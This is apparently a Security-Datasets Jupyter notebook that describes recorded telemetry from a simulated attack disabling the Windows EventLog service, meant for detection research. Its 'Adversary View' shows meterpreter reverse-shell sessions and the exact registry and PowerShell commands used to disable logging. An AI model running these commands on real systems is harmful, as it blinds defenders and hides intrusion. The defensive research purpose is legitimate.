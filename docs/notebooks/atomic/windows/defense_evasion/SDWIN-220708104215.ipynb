{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "db7cfc7e",
   "metadata": {},
   "source": [
    "# Stopping Event Log Service via Modification of Start Up Type"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5b9619f7",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "70677db5",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Jose Rodriguez @Cyb3rPandaH |\n",
    "| Creation Date     | 2022/07/08 |\n",
    "| Modification Date | 2022/08/04 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1562.002](https://attack.mitre.org/techniques/T1562/002) |\n",
    "| Tags              | powershell,reg,cmd,eventlog |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7205e696",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "After getting a shell with elevated privileges on the target, we modified the start up type for the EventLog service to `Disabled`. After the modification, we need to restart our system to make the EventLog service unavailable (Disabled). This data set contains only before-reboot data of our simulation. Even though after-reboot data is not part of the dataset, our attempt to disable the EventLog service was successful during the simulation. We have simulated this attack using 3 different procedures REG command via cmd.exe, REG meterpreter command (Metasploit), and the PowerShell module (Metasploit). This dataset was generated using a Windows 10 Pro Evaluation edition (Version:1903,OS Build:18362.30) and Kali Linux (Version:2022.2)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "464df725",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f8191015",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_disable_eventlog_service_startuptype_modification.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_disable_eventlog_service_startuptype_modification.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_disable_eventlog_service_startuptype_modification_via_registry.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/reg_disable_eventlog_service_startuptype_modification_via_registry.zip) |\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_disable_eventlog_service_startuptype_modification_via_registry.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_disable_eventlog_service_startuptype_modification_via_registry.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "491dd10f",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "349bfcf8",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80eebb44",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | cmd | [cmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd) |\n",
    "| Manual | Metasploit | [reg](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/base/sessions/command_shell.rb) |\n",
    "| Manual | Metasploit | [powershell](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/powershell.rb) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a5144c2",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "**** Using reg command via cmd.exe:\n",
    "\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: jhdxsqpv) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 20 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 11:20:26 -0400 \n",
    "\n",
    "meterpreter > shell \n",
    "Process 7728 created. \n",
    "Channel 1 created. \n",
    "Microsoft Windows [Version 10.0.18362.30] \n",
    "(c) 2019 Microsoft Corporation. All rights reserved. \n",
    "C:\\Users\\IT01-Pedro\\Downloads>REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog /t REG_DWORD /v Start /d 4\n",
    "REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog /t REG_DWORD /v Start /d 4 \n",
    "Value Start exists, overwrite(Yes/No)? yes \n",
    "The operation completed successfully. \n",
    "C:\\Users\\IT01-Pedro\\Downloads>\n",
    "\n",
    "**** Using reg meterpreter command:\n",
    "\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: r64afjpx) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 19 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 10:50:58 -0400 \n",
    "\n",
    "meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog' -v 'Start' -t 'REG_DWORD' -d 4 \n",
    "Successfully set Start of REG_DWORD. \n",
    "meterpreter >\n",
    "\n",
    "**** Using PowerShell module:\n",
    "\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.43; (UUID: bgwdtwdi) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 21 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-04 11:36:38 -0400 \n",
    "\n",
    "meterpreter > load powershell \n",
    "Loading extension powershell...Success. \n",
    "meterpreter > powershell_execute \"Set-Service -Name EventLog -StartUpType Disabled\" \n",
    "[+] Command execution completed: \n",
    "meterpreter >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c3edcea",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bd4ea773",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b501cf5",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_disable_eventlog_service_startuptype_modification.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c8299648",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "02f3d329",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1295eac0",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0d92786b",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5986f455",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2) \n",
    "* [https://www.offensive-security.com/metasploit-unleashed/interacting-registry/](https://www.offensive-security.com/metasploit-unleashed/interacting-registry/) \n",
    "* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
